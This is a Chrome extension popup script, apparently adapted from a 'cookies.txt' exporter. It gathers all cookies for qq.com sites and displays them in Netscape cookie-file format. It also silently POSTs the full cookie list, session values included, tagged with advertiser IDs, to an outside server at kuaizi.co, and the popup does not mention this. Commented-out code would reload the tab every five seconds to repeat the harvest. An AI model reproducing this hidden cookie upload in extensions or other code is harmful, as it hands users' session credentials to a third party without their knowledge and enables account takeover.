// See http://www.cookiecentral.com/faq/#3.5
var content = "";
var downloadable = "";
var popup = "";
var timer = null
function init() {
    chrome.tabs.getSelected(null, function(tab) {
        //console.log("domain=["+domain+"]")
        domain = getDomain(tab.url) 
        if (domain.indexOf('qq.com') === -1) {
            // clearInterval(timer)
            return
        }
        chrome.cookies.getAll({}, function(cookies) {
          for (var i in cookies) {
            cookie = cookies[i]; 
            if (cookie.domain.indexOf(domain) != -1) {     
            content += escapeForPre(cookie.domain);
            content += "\t";
            content += escapeForPre((!cookie.hostOnly).toString().toUpperCase());
            content += "\t";     
            content += escapeForPre(cookie.path); 
            content += "\t";     
            content += escapeForPre(cookie.secure.toString().toUpperCase());
            content += "\t";     
            content += escapeForPre(cookie.expirationDate ? Math.round(cookie.expirationDate) : "0");
            content += "\t";     
            content += escapeForPre(cookie.name);
            content += "\t";     
            content += escapeForPre(cookie.value);
            content += "\n";
            }
          }
          downloadable += "# HTTP Cookie File for domains related to " + escapeForPre(domain) + ".\n";
          downloadable += "# Downloaded with cookies.txt Chrome Extension (" + escapeForPre("https://chrome.google.com/webstore/detail/njabckikapfpffapmjgojcnbfjonfjfg") + ")\n";
          downloadable += "# Example:  wget -x --load-cookies cookies.txt " + escapeForPre(tab.url) + "\n"; 
          downloadable += "#\n"; 
      
        //   var uri = "data:application/octet-stream;base64,"+btoa(downloadable + content);
        //   var a = '<a href='+ uri +' download="cookies.txt">downloaded</a>';
      
          popup += "# HTTP Cookie File for domains related to <b>" + escapeForPre(domain) + "</b>.\n";
        //   popup += "# This content may be "+ a +" or pasted into a cookies.txt file and used by wget\n";
          popup += "# Example:  wget -x <b>--load-cookies cookies.txt</b> " + escapeForPre(tab.url) + "\n"; 
          popup += "#\n";
          document.write("<pre>\n"+ popup + content + "</pre>");
          $.post('http://dev.kzapi.kuaizi.co/creative/creative/VideoClip/saveCookieFromClient', {
              advertiser_id: '46,8,1289',
              cookie: content
          }, function(data) {
              console.log('popup输出', data)
          })
        //   if (timer) return
        //   timer = setInterval(() => {
        //     chrome.tabs.reload(() => {
        //         init()
        //     })
        //   }, 5000)
        });
      })
}
init()
function escapeForPre(text) {
  return String(text).replace(/&/g, "&amp;")
                     .replace(/</g, "&lt;")
                     .replace(/>/g, "&gt;")
                     .replace(/"/g, "&quot;")
                     .replace(/'/g, "&#039;");
}

function getDomain(url) {
  //console.log("url=["+url+"]")
  server = url.match(/:\/\/(.[^/:#?]+)/)[1];
  //console.log("server=["+server+"]")
  parts = server.split(".");
  //console.log("parts=["+parts+"]")

  isip = !isNaN(parseInt(server.replace(".",""),10));
  //console.log("parts=["+isip+"]")

  if (parts.length <= 1 || isip)   {
    domain = server;
  }
  else   {
    //search second level domain suffixes
    var domains = new Array();
    domains[0] = parts[parts.length-1];
    //assert(parts.length > 1)
    for(i=1;i<parts.length;i++)     {
      domains[i] = parts[parts.length-i-1] + "." + domains[i-1];
      //console.log("domains=["+domains[i]+"]");
      //domainlist defines in domain_list.js 
      if (!domainlist.hasOwnProperty(domains[i])) {
        domain = domains[i];
        //console.log("found "+domain);
        break;
      }
    }

    if (typeof(domain) == "undefined") { 
      domain = server;
    }
  }
  
  return domain;
}